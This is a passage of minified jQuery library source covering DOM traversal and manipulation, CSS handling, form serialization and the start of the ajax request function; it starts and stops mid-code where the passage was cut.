i=e.handleObj,x(e.delegateTarget).off(i.namespace?i.origType+"."+i.namespace:i.origType,i.selector,i.handler),this;if("object"==typeof e){for(o in e)this.off(o,n,e[o]);return this}return(n===!1||"function"==typeof n)&&(r=n,n=t),r===!1&&(r=ot),this.each(function(){x.event.remove(this,e,r,n)})},trigger:function(e,t){return this.each(function(){x.event.trigger(e,t,this)})},triggerHandler:function(e,n){var r=this[0];return r?x.event.trigger(e,n,r,!0):t}});var st=/^.[^:#\[\.,]*$/,lt=/^(?:parents|prev(?:Until|All))/,ut=x.expr.match.needsContext,ct={children:!0,contents:!0,next:!0,prev:!0};x.fn.extend({find:function(e){var t,n=[],r=this,i=r.length;if("string"!=typeof e)return this.pushStack(x(e).filter(function(){for(t=0;i>t;t++)if(x.contains(r[t],this))return!0}));for(t=0;i>t;t++)x.find(e,r[t],n);return n=this.pushStack(i>1?x.unique(n):n),n.selector=this.selector?this.selector+" "+e:e,n},has:function(e){var t,n=x(e,this),r=n.length;return this.filter(function(){for(t=0;r>t;t++)if(x.contains(this,n[t]))return!0})},not:function(e){return this.pushStack(ft(this,e||[],!0))},filter:function(e){return this.pushStack(ft(this,e||[],!1))},is:function(e){return!!ft(this,"string"==typeof e&&ut.test(e)?x(e):e||[],!1).length},closest:function(e,t){var n,r=0,i=this.length,o=[],a=ut.test(e)||"string"!=typeof e?x(e,t||this.context):0;for(;i>r;r++)for(n=this[r];n&&n!==t;n=n.parentNode)if(11>n.nodeType&&(a?a.index(n)>-1:1===n.nodeType&&x.find.matchesSelector(n,e))){n=o.push(n);break}return this.pushStack(o.length>1?x.unique(o):o)},index:function(e){return e?"string"==typeof e?x.inArray(this[0],x(e)):x.inArray(e.jquery?e[0]:e,this):this[0]&&this[0].parentNode?this.first().prevAll().length:-1},add:function(e,t){var n="string"==typeof e?x(e,t):x.makeArray(e&&e.nodeType?[e]:e),r=x.merge(this.get(),n);return this.pushStack(x.unique(r))},addBack:function(e){return this.add(null==e?this.prevObject:this.prevObject.filter(e))}});function pt(e,t){do e=e[t];while(e&&1!==e.nodeType);return e}x.each({parent:function(e){var t=e.parentNode;return t&&11!==t.nodeType?t:null},parents:function(e){return x.dir(e,"parentNode")},parentsUntil:function(e,t,n){return x.dir(e,"parentNode",n)},next:function(e){return pt(e,"nextSibling")},prev:function(e){return pt(e,"previousSibling")},nextAll:function(e){return x.dir(e,"nextSibling")},prevAll:function(e){return x.dir(e,"previousSibling")},nextUntil:function(e,t,n){return x.dir(e,"nextSibling",n)},prevUntil:function(e,t,n){return x.dir(e,"previousSibling",n)},siblings:function(e){return x.sibling((e.parentNode||{}).firstChild,e)},children:function(e){return x.sibling(e.firstChild)},contents:function(e){return x.nodeName(e,"iframe")?e.contentDocument||e.contentWindow.document:x.merge([],e.childNodes)}},function(e,t){x.fn[e]=function(n,r){var i=x.map(this,t,n);return"Until"!==e.slice(-5)&&(r=n),r&&"string"==typeof r&&(i=x.filter(r,i)),this.length>1&&(ct[e]||(i=x.unique(i)),lt.test(e)&&(i=i.reverse())),this.pushStack(i)}}),x.extend({filter:function(e,t,n){var r=t[0];return n&&(e=":not("+e+")"),1===t.length&&1===r.nodeType?x.find.matchesSelector(r,e)?[r]:[]:x.find.matches(e,x.grep(t,function(e){return 1===e.nodeType}))},dir:function(e,n,r){var i=[],o=e[n];while(o&&9!==o.nodeType&&(r===t||1!==o.nodeType||!x(o).is(r)))1===o.nodeType&&i.push(o),o=o[n];return i},sibling:function(e,t){var n=[];for(;e;e=e.nextSibling)1===e.nodeType&&e!==t&&n.push(e);return n}});function ft(e,t,n){if(x.isFunction(t))return x.grep(e,function(e,r){return!!t.call(e,r,e)!==n});if(t.nodeType)return x.grep(e,function(e){return e===t!==n});if("string"==typeof t){if(st.test(t))return x.filter(t,e,n);t=x.filter(t,e)}return x.grep(e,function(e){return x.inArray(e,t)>=0!==n})}function dt(e){var t=ht.split("|"),n=e.createDocumentFragment();if(n.createElement)while(t.length)n.createElement(t.pop());return n}var ht="abbr|article|aside|audio|bdi|canvas|data|datalist|details|figcaption|figure|footer|header|hgroup|mark|meter|nav|output|progress|section|summary|time|video",gt=/ jQuery\d+="(?:null|\d+)"/g,mt=RegExp("<(?:"+ht+")[\\s/>]","i"),yt=/^\s+/,vt=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,bt=/<([\w:]+)/,xt=/<tbody/i,wt=/<|&#?\w+;/,Tt=/<(?:script|style|link)/i,Ct=/^(?:checkbox|radio)$/i,Nt=/checked\s*(?:[^=]|=\s*.checked.)/i,kt=/^$|\/(?:java|ecma)script/i,Et=/^true\/(.*)/,St=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,At={option:[1,"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],area:[1,"<map>","</map>"],param:[1,"<object>","</object>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:x.support.htmlSerialize?[0,"",""]:[1,"X<div>","</div>"]},jt=dt(a),Dt=jt.appendChild(a.createElement("div"));At.optgroup=At.option,At.tbody=At.tfoot=At.colgroup=At.caption=At.thead,At.th=At.td,x.fn.extend({text:function(e){return x.access(this,function(e){return e===t?x.text(this):this.empty().append((this[0]&&this[0].ownerDocument||a).createTextNode(e))},null,e,arguments.length)},append:function(){return this.domManip(arguments,function(e){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var t=Lt(this,e);t.appendChild(e)}})},prepend:function(){return this.domManip(arguments,function(e){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var t=Lt(this,e);t.insertBefore(e,t.firstChild)}})},before:function(){return this.domManip(arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this)})},after:function(){return this.domManip(arguments,function(e){this.parentNode&&this.parentNode.insertBefore(e,this.nextSibling)})},remove:function(e,t){var n,r=e?x.filter(e,this):this,i=0;for(;null!=(n=r[i]);i++)t||1!==n.nodeType||x.cleanData(Ft(n)),n.parentNode&&(t&&x.contains(n.ownerDocument,n)&&_t(Ft(n,"script")),n.parentNode.removeChild(n));return this},empty:function(){var e,t=0;for(;null!=(e=this[t]);t++){1===e.nodeType&&x.cleanData(Ft(e,!1));while(e.firstChild)e.removeChild(e.firstChild);e.options&&x.nodeName(e,"select")&&(e.options.length=0)}return this},clone:function(e,t){return e=null==e?!1:e,t=null==t?e:t,this.map(function(){return x.clone(this,e,t)})},html:function(e){return x.access(this,function(e){var n=this[0]||{},r=0,i=this.length;if(e===t)return 1===n.nodeType?n.innerHTML.replace(gt,""):t;if(!("string"!=typeof e||Tt.test(e)||!x.support.htmlSerialize&&mt.test(e)||!x.support.leadingWhitespace&&yt.test(e)||At[(bt.exec(e)||["",""])[1].toLowerCase()])){e=e.replace(vt,"<$1></$2>");try{for(;i>r;r++)n=this[r]||{},1===n.nodeType&&(x.cleanData(Ft(n,!1)),n.innerHTML=e);n=0}catch(o){}}n&&this.empty().append(e)},null,e,arguments.length)},replaceWith:function(){var e=x.map(this,function(e){return[e.nextSibling,e.parentNode]}),t=0;return this.domManip(arguments,function(n){var r=e[t++],i=e[t++];i&&(r&&r.parentNode!==i&&(r=this.nextSibling),x(this).remove(),i.insertBefore(n,r))},!0),t?this:this.remove()},detach:function(e){return this.remove(e,!0)},domManip:function(e,t,n){e=d.apply([],e);var r,i,o,a,s,l,u=0,c=this.length,p=this,f=c-1,h=e[0],g=x.isFunction(h);if(g||!(1>=c||"string"!=typeof h||x.support.checkClone)&&Nt.test(h))return this.each(function(r){var i=p.eq(r);g&&(e[0]=h.call(this,r,i.html())),i.domManip(e,t,n)});if(c&&(l=x.buildFragment(e,this[0].ownerDocument,!1,!n&&this),r=l.firstChild,1===l.childNodes.length&&(l=r),r)){for(a=x.map(Ft(l,"script"),Ht),o=a.length;c>u;u++)i=l,u!==f&&(i=x.clone(i,!0,!0),o&&x.merge(a,Ft(i,"script"))),t.call(this[u],i,u);if(o)for(s=a[a.length-1].ownerDocument,x.map(a,qt),u=0;o>u;u++)i=a[u],kt.test(i.type||"")&&!x._data(i,"globalEval")&&x.contains(s,i)&&(i.src?x._evalUrl(i.src):x.globalEval((i.text||i.textContent||i.innerHTML||"").replace(St,"")));l=r=null}return this}});function Lt(e,t){return x.nodeName(e,"table")&&x.nodeName(1===t.nodeType?t:t.firstChild,"tr")?e.getElementsByTagName("tbody")[0]||e.appendChild(e.ownerDocument.createElement("tbody")):e}function Ht(e){return e.type=(null!==x.find.attr(e,"type"))+"/"+e.type,e}function qt(e){var t=Et.exec(e.type);return t?e.type=t[1]:e.removeAttribute("type"),e}function _t(e,t){var n,r=0;for(;null!=(n=e[r]);r++)x._data(n,"globalEval",!t||x._data(t[r],"globalEval"))}function Mt(e,t){if(1===t.nodeType&&x.hasData(e)){var n,r,i,o=x._data(e),a=x._data(t,o),s=o.events;if(s){delete a.handle,a.events={};for(n in s)for(r=0,i=s[n].length;i>r;r++)x.event.add(t,n,s[n][r])}a.data&&(a.data=x.extend({},a.data))}}function Ot(e,t){var n,r,i;if(1===t.nodeType){if(n=t.nodeName.toLowerCase(),!x.support.noCloneEvent&&t[x.expando]){i=x._data(t);for(r in i.events)x.removeEvent(t,r,i.handle);t.removeAttribute(x.expando)}"script"===n&&t.text!==e.text?(Ht(t).text=e.text,qt(t)):"object"===n?(t.parentNode&&(t.outerHTML=e.outerHTML),x.support.html5Clone&&e.innerHTML&&!x.trim(t.innerHTML)&&(t.innerHTML=e.innerHTML)):"input"===n&&Ct.test(e.type)?(t.defaultChecked=t.checked=e.checked,t.value!==e.value&&(t.value=e.value)):"option"===n?t.defaultSelected=t.selected=e.defaultSelected:("input"===n||"textarea"===n)&&(t.defaultValue=e.defaultValue)}}x.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(e,t){x.fn[e]=function(e){var n,r=0,i=[],o=x(e),a=o.length-1;for(;a>=r;r++)n=r===a?this:this.clone(!0),x(o[r])[t](n),h.apply(i,n.get());return this.pushStack(i)}});function Ft(e,n){var r,o,a=0,s=typeof e.getElementsByTagName!==i?e.getElementsByTagName(n||"*"):typeof e.querySelectorAll!==i?e.querySelectorAll(n||"*"):t;if(!s)for(s=[],r=e.childNodes||e;null!=(o=r[a]);a++)!n||x.nodeName(o,n)?s.push(o):x.merge(s,Ft(o,n));return n===t||n&&x.nodeName(e,n)?x.merge([e],s):s}function Bt(e){Ct.test(e.type)&&(e.defaultChecked=e.checked)}x.extend({clone:function(e,t,n){var r,i,o,a,s,l=x.contains(e.ownerDocument,e);if(x.support.html5Clone||x.isXMLDoc(e)||!mt.test("<"+e.nodeName+">")?o=e.cloneNode(!0):(Dt.innerHTML=e.outerHTML,Dt.removeChild(o=Dt.firstChild)),!(x.support.noCloneEvent&&x.support.noCloneChecked||1!==e.nodeType&&11!==e.nodeType||x.isXMLDoc(e)))for(r=Ft(o),s=Ft(e),a=0;null!=(i=s[a]);++a)r[a]&&Ot(i,r[a]);if(t)if(n)for(s=s||Ft(e),r=r||Ft(o),a=0;null!=(i=s[a]);a++)Mt(i,r[a]);else Mt(e,o);return r=Ft(o,"script"),r.length>0&&_t(r,!l&&Ft(e,"script")),r=s=i=null,o},buildFragment:function(e,t,n,r){var i,o,a,s,l,u,c,p=e.length,f=dt(t),d=[],h=0;for(;p>h;h++)if(o=e[h],o||0===o)if("object"===x.type(o))x.merge(d,o.nodeType?[o]:o);else if(wt.test(o)){s=s||f.appendChild(t.createElement("div")),l=(bt.exec(o)||["",""])[1].toLowerCase(),c=At[l]||At._default,s.innerHTML=c[1]+o.replace(vt,"<$1></$2>")+c[2],i=c[0];while(i--)s=s.lastChild;if(!x.support.leadingWhitespace&&yt.test(o)&&d.push(t.createTextNode(yt.exec(o)[0])),!x.support.tbody){o="table"!==l||xt.test(o)?"<table>"!==c[1]||xt.test(o)?0:s:s.firstChild,i=o&&o.childNodes.length;while(i--)x.nodeName(u=o.childNodes[i],"tbody")&&!u.childNodes.length&&o.removeChild(u)}x.merge(d,s.childNodes),s.textContent="";while(s.firstChild)s.removeChild(s.firstChild);s=f.lastChild}else d.push(t.createTextNode(o));s&&f.removeChild(s),x.support.appendChecked||x.grep(Ft(d,"input"),Bt),h=0;while(o=d[h++])if((!r||-1===x.inArray(o,r))&&(a=x.contains(o.ownerDocument,o),s=Ft(f.appendChild(o),"script"),a&&_t(s),n)){i=0;while(o=s[i++])kt.test(o.type||"")&&n.push(o)}return s=null,f},cleanData:function(e,t){var n,r,o,a,s=0,l=x.expando,u=x.cache,c=x.support.deleteExpando,f=x.event.special;for(;null!=(n=e[s]);s++)if((t||x.acceptData(n))&&(o=n[l],a=o&&u[o])){if(a.events)for(r in a.events)f[r]?x.event.remove(n,r):x.removeEvent(n,r,a.handle);
u[o]&&(delete u[o],c?delete n[l]:typeof n.removeAttribute!==i?n.removeAttribute(l):n[l]=null,p.push(o))}},_evalUrl:function(e){return x.ajax({url:e,type:"GET",dataType:"script",async:!1,global:!1,"throws":!0})}}),x.fn.extend({wrapAll:function(e){if(x.isFunction(e))return this.each(function(t){x(this).wrapAll(e.call(this,t))});if(this[0]){var t=x(e,this[0].ownerDocument).eq(0).clone(!0);this[0].parentNode&&t.insertBefore(this[0]),t.map(function(){var e=this;while(e.firstChild&&1===e.firstChild.nodeType)e=e.firstChild;return e}).append(this)}return this},wrapInner:function(e){return x.isFunction(e)?this.each(function(t){x(this).wrapInner(e.call(this,t))}):this.each(function(){var t=x(this),n=t.contents();n.length?n.wrapAll(e):t.append(e)})},wrap:function(e){var t=x.isFunction(e);return this.each(function(n){x(this).wrapAll(t?e.call(this,n):e)})},unwrap:function(){return this.parent().each(function(){x.nodeName(this,"body")||x(this).replaceWith(this.childNodes)}).end()}});var Pt,Rt,Wt,$t=/alpha\([^)]*\)/i,It=/opacity\s*=\s*([^)]*)/,zt=/^(top|right|bottom|left)$/,Xt=/^(none|table(?!-c[ea]).+)/,Ut=/^margin/,Vt=RegExp("^("+w+")(.*)$","i"),Yt=RegExp("^("+w+")(?!px)[a-z%]+$","i"),Jt=RegExp("^([+-])=("+w+")","i"),Gt={BODY:"block"},Qt={position:"absolute",visibility:"hidden",display:"block"},Kt={letterSpacing:0,fontWeight:400},Zt=["Top","Right","Bottom","Left"],en=["Webkit","O","Moz","ms"];function tn(e,t){if(t in e)return t;var n=t.charAt(0).toUpperCase()+t.slice(1),r=t,i=en.length;while(i--)if(t=en[i]+n,t in e)return t;return r}function nn(e,t){return e=t||e,"none"===x.css(e,"display")||!x.contains(e.ownerDocument,e)}function rn(e,t){var n,r,i,o=[],a=0,s=e.length;for(;s>a;a++)r=e[a],r.style&&(o[a]=x._data(r,"olddisplay"),n=r.style.display,t?(o[a]||"none"!==n||(r.style.display=""),""===r.style.display&&nn(r)&&(o[a]=x._data(r,"olddisplay",ln(r.nodeName)))):o[a]||(i=nn(r),(n&&"none"!==n||!i)&&x._data(r,"olddisplay",i?n:x.css(r,"display"))));for(a=0;s>a;a++)r=e[a],r.style&&(t&&"none"!==r.style.display&&""!==r.style.display||(r.style.display=t?o[a]||"":"none"));return e}x.fn.extend({css:function(e,n){return x.access(this,function(e,n,r){var i,o,a={},s=0;if(x.isArray(n)){for(o=Rt(e),i=n.length;i>s;s++)a[n[s]]=x.css(e,n[s],!1,o);return a}return r!==t?x.style(e,n,r):x.css(e,n)},e,n,arguments.length>1)},show:function(){return rn(this,!0)},hide:function(){return rn(this)},toggle:function(e){return"boolean"==typeof e?e?this.show():this.hide():this.each(function(){nn(this)?x(this).show():x(this).hide()})}}),x.extend({cssHooks:{opacity:{get:function(e,t){if(t){var n=Wt(e,"opacity");return""===n?"1":n}}}},cssNumber:{columnCount:!0,fillOpacity:!0,fontWeight:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{"float":x.support.cssFloat?"cssFloat":"styleFloat"},style:function(e,n,r,i){if(e&&3!==e.nodeType&&8!==e.nodeType&&e.style){var o,a,s,l=x.camelCase(n),u=e.style;if(n=x.cssProps[l]||(x.cssProps[l]=tn(u,l)),s=x.cssHooks[n]||x.cssHooks[l],r===t)return s&&"get"in s&&(o=s.get(e,!1,i))!==t?o:u[n];if(a=typeof r,"string"===a&&(o=Jt.exec(r))&&(r=(o[1]+1)*o[2]+parseFloat(x.css(e,n)),a="number"),!(null==r||"number"===a&&isNaN(r)||("number"!==a||x.cssNumber[l]||(r+="px"),x.support.clearCloneStyle||""!==r||0!==n.indexOf("background")||(u[n]="inherit"),s&&"set"in s&&(r=s.set(e,r,i))===t)))try{u[n]=r}catch(c){}}},css:function(e,n,r,i){var o,a,s,l=x.camelCase(n);return n=x.cssProps[l]||(x.cssProps[l]=tn(e.style,l)),s=x.cssHooks[n]||x.cssHooks[l],s&&"get"in s&&(a=s.get(e,!0,r)),a===t&&(a=Wt(e,n,i)),"normal"===a&&n in Kt&&(a=Kt[n]),""===r||r?(o=parseFloat(a),r===!0||x.isNumeric(o)?o||0:a):a}}),e.getComputedStyle?(Rt=function(t){return e.getComputedStyle(t,null)},Wt=function(e,n,r){var i,o,a,s=r||Rt(e),l=s?s.getPropertyValue(n)||s[n]:t,u=e.style;return s&&(""!==l||x.contains(e.ownerDocument,e)||(l=x.style(e,n)),Yt.test(l)&&Ut.test(n)&&(i=u.width,o=u.minWidth,a=u.maxWidth,u.minWidth=u.maxWidth=u.width=l,l=s.width,u.width=i,u.minWidth=o,u.maxWidth=a)),l}):a.documentElement.currentStyle&&(Rt=function(e){return e.currentStyle},Wt=function(e,n,r){var i,o,a,s=r||Rt(e),l=s?s[n]:t,u=e.style;return null==l&&u&&u[n]&&(l=u[n]),Yt.test(l)&&!zt.test(n)&&(i=u.left,o=e.runtimeStyle,a=o&&o.left,a&&(o.left=e.currentStyle.left),u.left="fontSize"===n?"1em":l,l=u.pixelLeft+"px",u.left=i,a&&(o.left=a)),""===l?"auto":l});function on(e,t,n){var r=Vt.exec(t);return r?Math.max(0,r[1]-(n||0))+(r[2]||"px"):t}function an(e,t,n,r,i){var o=n===(r?"border":"content")?4:"width"===t?1:0,a=0;for(;4>o;o+=2)"margin"===n&&(a+=x.css(e,n+Zt[o],!0,i)),r?("content"===n&&(a-=x.css(e,"padding"+Zt[o],!0,i)),"margin"!==n&&(a-=x.css(e,"border"+Zt[o]+"Width",!0,i))):(a+=x.css(e,"padding"+Zt[o],!0,i),"padding"!==n&&(a+=x.css(e,"border"+Zt[o]+"Width",!0,i)));return a}function sn(e,t,n){var r=!0,i="width"===t?e.offsetWidth:e.offsetHeight,o=Rt(e),a=x.support.boxSizing&&"border-box"===x.css(e,"boxSizing",!1,o);if(0>=i||null==i){if(i=Wt(e,t,o),(0>i||null==i)&&(i=e.style[t]),Yt.test(i))return i;r=a&&(x.support.boxSizingReliable||i===e.style[t]),i=parseFloat(i)||0}return i+an(e,t,n||(a?"border":"content"),r,o)+"px"}function ln(e){var t=a,n=Gt[e];return n||(n=un(e,t),"none"!==n&&n||(Pt=(Pt||x("<iframe frameborder='0' width='0' height='0'/>").css("cssText","display:block !important")).appendTo(t.documentElement),t=(Pt[0].contentWindow||Pt[0].contentDocument).document,t.write("<!doctype html><html><body>"),t.close(),n=un(e,t),Pt.detach()),Gt[e]=n),n}function un(e,t){var n=x(t.createElement(e)).appendTo(t.body),r=x.css(n[0],"display");return n.remove(),r}x.each(["height","width"],function(e,n){x.cssHooks[n]={get:function(e,r,i){return r?0===e.offsetWidth&&Xt.test(x.css(e,"display"))?x.swap(e,Qt,function(){return sn(e,n,i)}):sn(e,n,i):t},set:function(e,t,r){var i=r&&Rt(e);return on(e,t,r?an(e,n,r,x.support.boxSizing&&"border-box"===x.css(e,"boxSizing",!1,i),i):0)}}}),x.support.opacity||(x.cssHooks.opacity={get:function(e,t){return It.test((t&&e.currentStyle?e.currentStyle.filter:e.style.filter)||"")?.01*parseFloat(RegExp.$1)+"":t?"1":""},set:function(e,t){var n=e.style,r=e.currentStyle,i=x.isNumeric(t)?"alpha(opacity="+100*t+")":"",o=r&&r.filter||n.filter||"";n.zoom=1,(t>=1||""===t)&&""===x.trim(o.replace($t,""))&&n.removeAttribute&&(n.removeAttribute("filter"),""===t||r&&!r.filter)||(n.filter=$t.test(o)?o.replace($t,i):o+" "+i)}}),x(function(){x.support.reliableMarginRight||(x.cssHooks.marginRight={get:function(e,n){return n?x.swap(e,{display:"inline-block"},Wt,[e,"marginRight"]):t}}),!x.support.pixelPosition&&x.fn.position&&x.each(["top","left"],function(e,n){x.cssHooks[n]={get:function(e,r){return r?(r=Wt(e,n),Yt.test(r)?x(e).position()[n]+"px":r):t}}})}),x.expr&&x.expr.filters&&(x.expr.filters.hidden=function(e){return 0>=e.offsetWidth&&0>=e.offsetHeight||!x.support.reliableHiddenOffsets&&"none"===(e.style&&e.style.display||x.css(e,"display"))},x.expr.filters.visible=function(e){return!x.expr.filters.hidden(e)}),x.each({margin:"",padding:"",border:"Width"},function(e,t){x.cssHooks[e+t]={expand:function(n){var r=0,i={},o="string"==typeof n?n.split(" "):[n];for(;4>r;r++)i[e+Zt[r]+t]=o[r]||o[r-2]||o[0];return i}},Ut.test(e)||(x.cssHooks[e+t].set=on)});var cn=/%20/g,pn=/\[\]$/,fn=/\r?\n/g,dn=/^(?:submit|button|image|reset|file)$/i,hn=/^(?:input|select|textarea|keygen)/i;x.fn.extend({serialize:function(){return x.param(this.serializeArray())},serializeArray:function(){return this.map(function(){var e=x.prop(this,"elements");return e?x.makeArray(e):this}).filter(function(){var e=this.type;return this.name&&!x(this).is(":disabled")&&hn.test(this.nodeName)&&!dn.test(e)&&(this.checked||!Ct.test(e))}).map(function(e,t){var n=x(this).val();return null==n?null:x.isArray(n)?x.map(n,function(e){return{name:t.name,value:e.replace(fn,"\r\n")}}):{name:t.name,value:n.replace(fn,"\r\n")}}).get()}}),x.param=function(e,n){var r,i=[],o=function(e,t){t=x.isFunction(t)?t():null==t?"":t,i[i.length]=encodeURIComponent(e)+"="+encodeURIComponent(t)};if(n===t&&(n=x.ajaxSettings&&x.ajaxSettings.traditional),x.isArray(e)||e.jquery&&!x.isPlainObject(e))x.each(e,function(){o(this.name,this.value)});else for(r in e)gn(r,e[r],n,o);return i.join("&").replace(cn,"+")};function gn(e,t,n,r){var i;if(x.isArray(t))x.each(t,function(t,i){n||pn.test(e)?r(e,i):gn(e+"["+("object"==typeof i?t:"")+"]",i,n,r)});else if(n||"object"!==x.type(t))r(e,t);else for(i in t)gn(e+"["+i+"]",t[i],n,r)}x.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "),function(e,t){x.fn[t]=function(e,n){return arguments.length>0?this.on(t,null,e,n):this.trigger(t)}}),x.fn.extend({hover:function(e,t){return this.mouseenter(e).mouseleave(t||e)},bind:function(e,t,n){return this.on(e,null,t,n)},unbind:function(e,t){return this.off(e,null,t)},delegate:function(e,t,n,r){return this.on(t,e,n,r)},undelegate:function(e,t,n){return 1===arguments.length?this.off(e,"**"):this.off(t,e||"**",n)}});var mn,yn,vn=x.now(),bn=/\?/,xn=/#.*$/,wn=/([?&])_=[^&]*/,Tn=/^(.*?):[ \t]*([^\r\n]*)\r?$/gm,Cn=/^(?:about|app|app-storage|.+-extension|file|res|widget):$/,Nn=/^(?:GET|HEAD)$/,kn=/^\/\//,En=/^([\w.+-]+:)(?:\/\/([^\/?#:]*)(?::(\d+)|)|)/,Sn=x.fn.load,An={},jn={},Dn="*/".concat("*");try{yn=o.href}catch(Ln){yn=a.createElement("a"),yn.href="",yn=yn.href}mn=En.exec(yn.toLowerCase())||[];function Hn(e){return function(t,n){"string"!=typeof t&&(n=t,t="*");var r,i=0,o=t.toLowerCase().match(T)||[];if(x.isFunction(n))while(r=o[i++])"+"===r[0]?(r=r.slice(1)||"*",(e[r]=e[r]||[]).unshift(n)):(e[r]=e[r]||[]).push(n)}}function qn(e,n,r,i){var o={},a=e===jn;function s(l){var u;return o[l]=!0,x.each(e[l]||[],function(e,l){var c=l(n,r,i);return"string"!=typeof c||a||o[c]?a?!(u=c):t:(n.dataTypes.unshift(c),s(c),!1)}),u}return s(n.dataTypes[0])||!o["*"]&&s("*")}function _n(e,n){var r,i,o=x.ajaxSettings.flatOptions||{};for(i in n)n[i]!==t&&((o[i]?e:r||(r={}))[i]=n[i]);return r&&x.extend(!0,e,r),e}x.fn.load=function(e,n,r){if("string"!=typeof e&&Sn)return Sn.apply(this,arguments);var i,o,a,s=this,l=e.indexOf(" ");return l>=0&&(i=e.slice(l,e.length),e=e.slice(0,l)),x.isFunction(n)?(r=n,n=t):n&&"object"==typeof n&&(a="POST"),s.length>0&&x.ajax({url:e,type:a,dataType:"html",data:n}).done(function(e){o=arguments,s.html(i?x("<div>").append(x.parseHTML(e)).find(i):e)}).complete(r&&function(e,t){s.each(r,o||[e.responseText,t,e])}),this},x.each(["ajaxStart","ajaxStop","ajaxComplete","ajaxError","ajaxSuccess","ajaxSend"],function(e,t){x.fn[t]=function(e){return this.on(t,e)}}),x.extend({active:0,lastModified:{},etag:{},ajaxSettings:{url:yn,type:"GET",isLocal:Cn.test(mn[1]),global:!0,processData:!0,async:!0,contentType:"application/x-www-form-urlencoded; charset=UTF-8",accepts:{"*":Dn,text:"text/plain",html:"text/html",xml:"application/xml, text/xml",json:"application/json, text/javascript"},contents:{xml:/xml/,html:/html/,json:/json/},responseFields:{xml:"responseXML",text:"responseText",json:"responseJSON"},converters:{"* text":String,"text html":!0,"text json":x.parseJSON,"text xml":x.parseXML},flatOptions:{url:!0,context:!0}},ajaxSetup:function(e,t){return t?_n(_n(e,x.ajaxSettings),t):_n(x.ajaxSettings,e)},ajaxPrefilter:Hn(An),ajaxTransport:Hn(jn),ajax:function(e,n){"object"==typeof e&&(n=e,e=t),n=n||{};var r,i,o,a,s,l,u,c,p=x.ajaxSetup({},n),f=p.context||p,d=p.context&&(f.nodeType||f.jquery)?x(f):x.event,h=x.Deferred(),g=x.Callbacks("once memory"),m=p.statusCode||{},y={},v={},b=0,w="canceled",C={readyState:0,getResponseHeader:function(e){var t;if(2===b){if(!c){c={};while(t=Tn.exec(a))c[t[1].toLowerCase()]=t[2]}t=c[e.toLowerCase()]}return null==t?null:t},getAllResponseHeaders:function(){return 2===b?a:null},setRequestHeader:function(e,t){var n=e.toLowerCase();return b||(e=v[n]=v[n]||e,y[e]=t),this},overrideMimeType:function(e){return b||(p.mimeType=e),this},statusCode:function(e){var t;if(e)if(2>b)for(t in e)m[t]=[m[t],e[t]];else C.always(e[C.status]);return this},abort:function(e){var t=e||w;return u&&u.abort(t),k(0,t),this}};if(h.promise(C).complete=g.add,C.success=C.done,C.error=C.fail,p.url=((e||p.url||yn)+"").replace(xn,"").replace(kn,mn[1]+"//"),p.type=n.method||n.type||p.method||p.type,p.dataTypes=x.trim(p.dataType||"*").toLowerCase().match(T)||[""],null==p.crossDomain&&(r=En.exec(p.url.toLowerCase()),p.crossDomain=!(!r||r[1]===mn[1]&&r[2]===mn[2]&&(r[3]||("http:"===r[1]?"80":"443"))===(mn[3]||("http:"===mn[1]?"80":"443")))),p.data&&p.processData&&"string"!=typeof p.data&&(p.data=x.param(p.data,p.traditional)),qn(An,p,n,C),2===b)return C;l=p.global,l&&0===x.active++&&x.event.trigger("ajaxStart"),p.type=p.type.toUpperCase(),p.hasContent=!Nn.test(p.type),o=p.url,p.hasContent||(p.data&&(o=p.url+=(bn.test(o)?"&":"?")+p.data,delete p.data),p.cache===!1&&(p.url=wn.test(o)?o.replace(wn,"$1_="+vn++):o+(bn.test(o)?"&":"?")+"_="+vn++)),p.ifModified&&(x.lastModified[o]&&C.setRequestHeader("If-Modified-Since",x.lastModified[o]),x.etag[o]&&C.setRequestHeader("If-None-Match",x.etag[o])),(p.data&&p.hasContent&&p.contentType!==!1||n.contentType)&&C.setRequestHeader("Content-Type",p.contentType),C.setRequestHeader("Accept",p.dataTypes[0]&&p.accepts[p.dataTypes[0]]?p.accepts[p.dataTypes[0]]+("*"!==p.dataTypes[0]?", "+Dn+"; q=0.01":""):p.accepts["*"]);for(i in p.headers)C.setRequestHeader(i,p.headers[i]);if(p.beforeSend&&(p.beforeSend.call(f,C,p)===!1||2===b))return C.abort();w="abort";for(i in{success:1,error:1,complete:1})C[i](p[i]);if(u=qn(jn,p,n,C)){C.readyState=1,l&&d.trigger("ajaxSend",[C,p]),p.async&&p.timeout>0&&(s=setTimeout(function(){C.abort("timeout")},p.timeout));try{b=1,u.send(y,k)}catch(N){if(!(2>b))throw N;k(-1,N)}}else k(-1,"No Transport");function k(e,n,r,i){var c,y,v,w,T,N=n;2!==b&&(b=2,s&&clearTimeout(s),u=t,a=i||"",C.readyState=e>0?4:0,c=e>=200&&300>e||304===e,r&&(w=Mn(p,C,r)),w=On(p,w,C,c),c?(p.ifModified&&(T=C.getResponseHeader("Last-Modified"),T&&(x.lastModified[o]=T),T=C.getResponseHeader("etag"),T&&(x.etag[o]=T)),204===e||"HEAD"===p.type?N="nocontent":304===e?N="notmodified":(N=w.state,y=w.data,v=w.error,c=!v)):(v=N,(e||!N)&&(N="error",0>e&&(e=0))),C.status=e,C.statusText=(n||N)+"",c?h.resolveWith(f,[y,N,C]):h.rejectWith(f,[C,N,v]),C.statusCode(m),m=t,l&&d.trigger(c?"ajaxSuccess":"ajaxError",[C,p,c?y:v]),g.fireWith(f,[C,N]),l&&(d.trigger("ajaxComplete",[C,p]),--x.active||x.event.trigger("ajaxStop")))}return 